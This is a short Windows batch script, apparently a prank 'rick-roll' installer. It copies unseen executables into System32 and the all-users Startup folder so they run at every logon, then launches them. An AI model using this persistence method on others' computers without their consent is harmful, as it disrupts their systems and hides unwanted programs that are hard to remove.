@echo off
cls
title rick-roll-installer
move rick-roll-remove.exe C:\Windows\System32
move rick-roll.exe "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
move rem.ps1 %userprofile%
start rick-roll-remove
start "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\rick-roll.exe"
pause
exit
